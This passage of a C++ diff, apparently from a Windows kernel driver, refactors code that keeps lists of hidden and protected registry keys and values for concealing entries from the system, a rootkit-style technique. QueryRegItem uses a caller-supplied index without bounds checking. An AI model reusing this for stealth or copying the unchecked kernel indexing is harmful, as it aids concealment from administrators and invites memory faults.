+			if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->ProtectedItems.Values.ValuesPath[i]) && _wcsnicmp(this->ProtectedItems.Values.ValuesPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0)
 				return true;
 		}
 	}
-	else if (type == REG_TYPE_HIDDEN_VALUE) {
-		for (int i = 0; i < rGlobals.HiddenItems.Values.ValuesCount; i++) {
-			if ((regKey.Length / sizeof(WCHAR)) <= wcslen(rGlobals.HiddenItems.Values.ValuesPath[i]) && _wcsnicmp(rGlobals.HiddenItems.Values.ValuesPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0)
+	else if (type == RegHiddenValue) {
+		for (ULONG i = 0; i < this->HiddenItems.Values.ValuesCount; i++) {
+			if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->HiddenItems.Values.ValuesPath[i]) && _wcsnicmp(this->HiddenItems.Values.ValuesPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0)
 				return true;
 		}
 	}
@@ -713,16 +752,16 @@ bool ContainsProtectedRegKey(UNICODE_STRING regKey, int type) {
 * AddRegItem is responsible for adding a registry item to the list of protected registry items.
 *
 * Parameters:
-* @item	  [RegItem&] -- Registry item to add.
+* @item	  [RegItem*] -- Registry item to add.
 *
 * Returns:
 * @status [bool]	 -- Whether successfully added or not.
 */
-bool AddRegItem(RegItem& item) {
-	if (item.Type == REG_TYPE_PROTECTED_KEY) {
+bool RegistryUtils::AddRegItem(RegItem* item) {
+	if (item->Type == RegProtectedKey) {
 		for (int i = 0; i < MAX_REG_ITEMS; i++)
-			if (rGlobals.ProtectedItems.Keys.KeysPath[i] == nullptr) {
-				auto len = (wcslen(item.KeyPath) + 1) * sizeof(WCHAR);
+			if (this->ProtectedItems.Keys.KeysPath[i] == nullptr) {
+				auto len = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
 				auto buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, len, DRIVER_TAG);
 
 				// Not enough resources.
@@ -731,16 +770,16 @@ bool AddRegItem(RegItem& item) {
 					break;
 				}
 
-				wcscpy_s(buffer, len / sizeof(WCHAR), item.KeyPath);
-				rGlobals.ProtectedItems.Keys.KeysPath[i] = buffer;
-				rGlobals.ProtectedItems.Keys.KeysCount++;
+				wcscpy_s(buffer, len / sizeof(WCHAR), item->KeyPath);
+				this->ProtectedItems.Keys.KeysPath[i] = buffer;
+				this->ProtectedItems.Keys.KeysCount++;
 				return true;
 			}
 	}
-	else if (item.Type == REG_TYPE_HIDDEN_KEY) {
+	else if (item->Type == RegHiddenKey) {
 		for (int i = 0; i < MAX_REG_ITEMS; i++)
-			if (rGlobals.HiddenItems.Keys.KeysPath[i] == nullptr) {
-				auto len = (wcslen(item.KeyPath) + 1) * sizeof(WCHAR);
+			if (this->HiddenItems.Keys.KeysPath[i] == nullptr) {
+				auto len = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
 				auto buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, len, DRIVER_TAG);
 
 				// Not enough resources.
@@ -749,16 +788,16 @@ bool AddRegItem(RegItem& item) {
 					break;
 				}
 
-				wcscpy_s(buffer, len / sizeof(WCHAR), item.KeyPath);
-				rGlobals.HiddenItems.Keys.KeysPath[i] = buffer;
-				rGlobals.HiddenItems.Keys.KeysCount++;
+				wcscpy_s(buffer, len / sizeof(WCHAR), item->KeyPath);
+				this->HiddenItems.Keys.KeysPath[i] = buffer;
+				this->HiddenItems.Keys.KeysCount++;
 				return true;
 			}
 	}
-	else if (item.Type == REG_TYPE_PROTECTED_VALUE) {
+	else if (item->Type == RegProtectedValue) {
 		for (int i = 0; i < MAX_REG_ITEMS; i++) {
-			if (rGlobals.ProtectedItems.Values.ValuesPath[i] == nullptr) {
-				auto keyLen = (wcslen(item.KeyPath) + 1) * sizeof(WCHAR);
+			if (this->ProtectedItems.Values.ValuesPath[i] == nullptr) {
+				auto keyLen = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
 				auto keyPath = (WCHAR*)ExAllocatePoolWithTag(PagedPool, keyLen, DRIVER_TAG);
 
 				// Not enough resources.
@@ -766,7 +805,7 @@ bool AddRegItem(RegItem& item) {
 					break;
 				}
 
-				auto valueNameLen = (wcslen(item.ValueName) + 1) * sizeof(WCHAR);
+				auto valueNameLen = (wcslen(item->ValueName) + 1) * sizeof(WCHAR);
 				auto valueName = (WCHAR*)ExAllocatePoolWithTag(PagedPool, valueNameLen, DRIVER_TAG);
 
 				if (!valueName) {
@@ -774,20 +813,20 @@ bool AddRegItem(RegItem& item) {
 					break;
 				}
 
-				wcscpy_s(keyPath, keyLen / sizeof(WCHAR), item.KeyPath);
-				wcscpy_s(valueName, valueNameLen / sizeof(WCHAR), item.ValueName);
-				rGlobals.ProtectedItems.Values.ValuesPath[i] = keyPath;
-				rGlobals.ProtectedItems.Values.ValuesName[i] = valueName;
-				rGlobals.ProtectedItems.Values.ValuesCount++;
+				wcscpy_s(keyPath, keyLen / sizeof(WCHAR), item->KeyPath);
+				wcscpy_s(valueName, valueNameLen / sizeof(WCHAR), item->ValueName);
+				this->ProtectedItems.Values.ValuesPath[i] = keyPath;
+				this->ProtectedItems.Values.ValuesName[i] = valueName;
+				this->ProtectedItems.Values.ValuesCount++;
 				return true;
 			}
 		}
 	}
 
-	else if (item.Type == REG_TYPE_HIDDEN_VALUE) {
+	else if (item->Type == RegHiddenValue) {
 		for (int i = 0; i < MAX_REG_ITEMS; i++) {
-			if (rGlobals.HiddenItems.Values.ValuesPath[i] == nullptr) {
-				auto keyLen = (wcslen(item.KeyPath) + 1) * sizeof(WCHAR);
+			if (this->HiddenItems.Values.ValuesPath[i] == nullptr) {
+				auto keyLen = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
 				auto keyPath = (WCHAR*)ExAllocatePoolWithTag(PagedPool, keyLen, DRIVER_TAG);
 
 				// Not enough resources.
@@ -795,7 +834,7 @@ bool AddRegItem(RegItem& item) {
 					break;
 				}
 
-				auto valueNameLen = (wcslen(item.ValueName) + 1) * sizeof(WCHAR);
+				auto valueNameLen = (wcslen(item->ValueName) + 1) * sizeof(WCHAR);
 				auto valueName = (WCHAR*)ExAllocatePoolWithTag(PagedPool, valueNameLen, DRIVER_TAG);
 
 				if (!valueName) {
@@ -803,11 +842,11 @@ bool AddRegItem(RegItem& item) {
 					break;
 				}
 
-				wcscpy_s(keyPath, keyLen / sizeof(WCHAR), item.KeyPath);
-				wcscpy_s(valueName, valueNameLen / sizeof(WCHAR), item.ValueName);
-				rGlobals.HiddenItems.Values.ValuesPath[i] = keyPath;
-				rGlobals.HiddenItems.Values.ValuesName[i] = valueName;
-				rGlobals.HiddenItems.Values.ValuesCount++;
+				wcscpy_s(keyPath, keyLen / sizeof(WCHAR), item->KeyPath);
+				wcscpy_s(valueName, valueNameLen / sizeof(WCHAR), item->ValueName);
+				this->HiddenItems.Values.ValuesPath[i] = keyPath;
+				this->HiddenItems.Values.ValuesName[i] = valueName;
+				this->HiddenItems.Values.ValuesCount++;
 				return true;
 			}
 		}
@@ -821,57 +860,221 @@ bool AddRegItem(RegItem& item) {
 * RemoveRegItem is responsible for remove a registry item from the list of protected registry items.
 *
 * Parameters:
-* @item	  [RegItem&] -- Registry item to remove.
+* @item	  [RegItem*] -- Registry item to remove.
 *
 * Returns:
 * @status [bool]	 -- Whether successfully removed or not.
 */
-bool RemoveRegItem(RegItem& item) {
-	if (item.Type == REG_TYPE_PROTECTED_KEY) {
-		for (int i = 0; i < rGlobals.ProtectedItems.Keys.KeysCount; i++) {
+bool RegistryUtils::RemoveRegItem(RegItem* item) {
+	if (item->Type == RegProtectedKey) {
+		for (ULONG i = 0; i < this->ProtectedItems.Keys.KeysCount; i++) {
 
-			if (_wcsicmp(rGlobals.ProtectedItems.Keys.KeysPath[i], item.KeyPath) == 0) {
-				ExFreePoolWithTag(rGlobals.ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
-				rGlobals.ProtectedItems.Keys.KeysPath[i] = nullptr;
-				rGlobals.ProtectedItems.Keys.KeysCount--;
+			if (_wcsicmp(this->ProtectedItems.Keys.KeysPath[i], item->KeyPath) == 0) {
+				ExFreePoolWithTag(this->ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
+				this->ProtectedItems.Keys.KeysPath[i] = nullptr;
+				this->ProtectedItems.Keys.KeysCount--;
 				return true;
 			}
 		}
 	}
-	else if (item.Type == REG_TYPE_HIDDEN_KEY) {
-		for (int i = 0; i < rGlobals.HiddenItems.Keys.KeysCount; i++) {
+	else if (item->Type == RegHiddenKey) {
+		for (ULONG i = 0; i < this->HiddenItems.Keys.KeysCount; i++) {
 
-			if (_wcsicmp(rGlobals.HiddenItems.Keys.KeysPath[i], item.KeyPath) == 0) {
-				ExFreePoolWithTag(rGlobals.HiddenItems.Keys.KeysPath[i], DRIVER_TAG);
-				rGlobals.HiddenItems.Keys.KeysPath[i] = nullptr;
-				rGlobals.HiddenItems.Keys.KeysCount--;
+			if (_wcsicmp(this->HiddenItems.Keys.KeysPath[i], item->KeyPath) == 0) {
+				ExFreePoolWithTag(this->HiddenItems.Keys.KeysPath[i], DRIVER_TAG);
+				this->HiddenItems.Keys.KeysPath[i] = nullptr;
+				this->HiddenItems.Keys.KeysCount--;
 				return true;
 			}
 		}
 	}
-	else if (item.Type == REG_TYPE_PROTECTED_VALUE) {
-		for (int i = 0; i < rGlobals.ProtectedItems.Values.ValuesCount; i++)
-			if (_wcsicmp(rGlobals.ProtectedItems.Values.ValuesPath[i], item.KeyPath) == 0 &&
-				_wcsicmp(rGlobals.ProtectedItems.Values.ValuesName[i], item.ValueName) == 0) {
-				ExFreePoolWithTag(rGlobals.ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
-				ExFreePoolWithTag(rGlobals.ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
-				rGlobals.ProtectedItems.Values.ValuesPath[i] = nullptr;
-				rGlobals.ProtectedItems.Values.ValuesName[i] = nullptr;
-				rGlobals.ProtectedItems.Values.ValuesCount--;
+	else if (item->Type == RegProtectedValue) {
+		for (ULONG i = 0; i < this->ProtectedItems.Values.ValuesCount; i++)
+			if (_wcsicmp(this->ProtectedItems.Values.ValuesPath[i], item->KeyPath) == 0 &&
+				_wcsicmp(this->ProtectedItems.Values.ValuesName[i], item->ValueName) == 0) {
+				ExFreePoolWithTag(this->ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
+				ExFreePoolWithTag(this->ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
+				this->ProtectedItems.Values.ValuesPath[i] = nullptr;
+				this->ProtectedItems.Values.ValuesName[i] = nullptr;
+				this->ProtectedItems.Values.ValuesCount--;
 				return true;
 			}
 	}
-	else if (item.Type == REG_TYPE_HIDDEN_VALUE) {
-		for (int i = 0; i < rGlobals.HiddenItems.Values.ValuesCount; i++)
-			if (_wcsicmp(rGlobals.HiddenItems.Values.ValuesPath[i], item.KeyPath) == 0 &&
-				_wcsicmp(rGlobals.HiddenItems.Values.ValuesName[i], item.ValueName) == 0) {
-				ExFreePoolWithTag(rGlobals.HiddenItems.Values.ValuesPath[i], DRIVER_TAG);
-				ExFreePoolWithTag(rGlobals.HiddenItems.Values.ValuesName[i], DRIVER_TAG);
-				rGlobals.HiddenItems.Values.ValuesPath[i] = nullptr;
-				rGlobals.HiddenItems.Values.ValuesName[i] = nullptr;
-				rGlobals.HiddenItems.Values.ValuesCount--;
+	else if (item->Type == RegHiddenValue) {
+		for (ULONG i = 0; i < this->HiddenItems.Values.ValuesCount; i++)
+			if (_wcsicmp(this->HiddenItems.Values.ValuesPath[i], item->KeyPath) == 0 &&
+				_wcsicmp(this->HiddenItems.Values.ValuesName[i], item->ValueName) == 0) {
+				ExFreePoolWithTag(this->HiddenItems.Values.ValuesPath[i], DRIVER_TAG);
+				ExFreePoolWithTag(this->HiddenItems.Values.ValuesName[i], DRIVER_TAG);
+				this->HiddenItems.Values.ValuesPath[i] = nullptr;
+				this->HiddenItems.Values.ValuesName[i] = nullptr;
+				this->HiddenItems.Values.ValuesCount--;
 				return true;
 			}
 	}
 	return false;
+}
+
+/*
+* Description:
+* ClearRegItem is responsible for clearing an array of registry items.
+*
+* Parameters:
+* @regType [RegItemType] -- Type of the registry item to clear.
+*
+* Returns:
+* There is no return value.
+*/
+void RegistryUtils::ClearRegItem(RegItemType regType) {
+	switch (regType) {
+	case RegProtectedKey:
+	{
+		for (ULONG i = 0; i < this->ProtectedItems.Keys.KeysCount; i++) {
+			ExFreePoolWithTag(this->ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
+			this->ProtectedItems.Keys.KeysPath[i] = nullptr;
+		}
+		this->ProtectedItems.Keys.KeysCount = 0;
+		break;
+	}
+	case RegHiddenKey:
+	{
+		for (ULONG i = 0; i < this->HiddenItems.Keys.KeysCount; i++) {
+			ExFreePoolWithTag(this->HiddenItems.Keys.KeysPath[i], DRIVER_TAG);
+			this->HiddenItems.Keys.KeysPath[i] = nullptr;
+		}
+		this->HiddenItems.Keys.KeysCount = 0;
+		break;
+	}
+	case RegProtectedValue:
+	{
+		for (ULONG i = 0; i < this->ProtectedItems.Values.ValuesCount; i++) {
+			ExFreePoolWithTag(this->ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
+			ExFreePoolWithTag(this->ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
+			this->ProtectedItems.Values.ValuesPath[i] = nullptr;
+			this->ProtectedItems.Values.ValuesName[i] = nullptr;
+		}
+		this->ProtectedItems.Values.ValuesCount = 0;
+		break;
+	}
+	case RegHiddenValue:
+	{
+		for (ULONG i = 0; i < this->HiddenItems.Values.ValuesCount; i++) {
+			ExFreePoolWithTag(this->HiddenItems.Values.ValuesPath[i], DRIVER_TAG);
+			ExFreePoolWithTag(this->HiddenItems.Values.ValuesName[i], DRIVER_TAG);
+			this->HiddenItems.Values.ValuesPath[i] = nullptr;
+			this->HiddenItems.Values.ValuesName[i] = nullptr;
+		}
+		this->HiddenItems.Values.ValuesCount = 0;
+		break;
+	}
+	}
+}
+
+/*
+* Description:
+* ClearRegItems is responsible for clearing all registry items arrays.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* There is no return value.
+*/
+void RegistryUtils::ClearRegItems() {
+	ClearRegItem(RegProtectedKey);
+	ClearRegItem(RegHiddenKey);
+	ClearRegItem(RegProtectedValue);
+	ClearRegItem(RegHiddenValue);
+}
+
+/*
+* Description:
+* QueryRegItem is responsible for getting a registry item from a registry item array.
+*
+* Parameters:
+* @item	  [RegItem*] -- Registry item to get.
+*
+* Returns:
+* @status [NTSTATUS] -- Whether successfully got or not.
+*/
+NTSTATUS RegistryUtils::QueryRegItem(RegItem* item) {
+	bool isFirstElement;
+	errno_t err = 0;
+	NTSTATUS status = STATUS_SUCCESS;
+
+	isFirstElement = item->RegItemsIndex == 0;
+
+	if (item->Type == RegProtectedKey) {
+		if (this->ProtectedItems.Keys.KeysCount > 0) {
+			err = wcscpy_s(item->KeyPath, this->ProtectedItems.Keys.KeysPath[item->RegItemsIndex]);
+
+			if (err != 0) {
+				status = STATUS_INVALID_USER_BUFFER;
+				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
+			}
+		}
+	}
+	else if (item->Type == RegHiddenKey) {
+		if (this->HiddenItems.Keys.KeysCount > 0) {
+			err = wcscpy_s(item->KeyPath, this->HiddenItems.Keys.KeysPath[item->RegItemsIndex]);
+
+			if (err != 0) {
+				status = STATUS_INVALID_USER_BUFFER;
+				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
+			}
+		}
+	}
+	else if (item->Type == RegProtectedValue) {
+		if (this->ProtectedItems.Values.ValuesCount > 0) {
+			err = wcscpy_s(item->KeyPath, this->ProtectedItems.Values.ValuesPath[item->RegItemsIndex]);
+
+			if (err != 0) {
+				status = STATUS_INVALID_USER_BUFFER;
+				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
+			}
+
+			err = wcscpy_s(item->ValueName, this->ProtectedItems.Values.ValuesName[item->RegItemsIndex]);
+
+			if (err != 0) {
+				status = STATUS_INVALID_USER_BUFFER;
+				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
+			}
+		}
+	}
+	else if (item->Type == RegHiddenValue) {
+		if (this->HiddenItems.Values.ValuesCount > 0) {
+			err = wcscpy_s(item->KeyPath, this->HiddenItems.Values.ValuesPath[item->RegItemsIndex]);
+
+			if (err != 0) {
+				status = STATUS_INVALID_USER_BUFFER;
+				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
+			}
+
+			err = wcscpy_s(item->ValueName, this->HiddenItems.Values.ValuesName[item->RegItemsIndex]);
+
+			if (err != 0) {
+				status = STATUS_INVALID_USER_BUFFER;
+				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
+			}
+		}
+	}
+
+	if (isFirstElement) {
+		switch (item->Type) {
+		case RegProtectedKey:
+			item->RegItemsIndex = this->ProtectedItems.Keys.KeysCount;
+			break;
+		case RegHiddenKey:
+			item->RegItemsIndex = this->HiddenItems.Keys.KeysCount;
+			break;
+		case RegProtectedValue:
+			item->RegItemsIndex = this->ProtectedItems.Values.ValuesCount;
+			break;
+		case RegHiddenValue:
+			item->RegItemsIndex = this->HiddenItems.Values.ValuesCount;
+			break;
+		}
+	}
+
+	return status;
 }
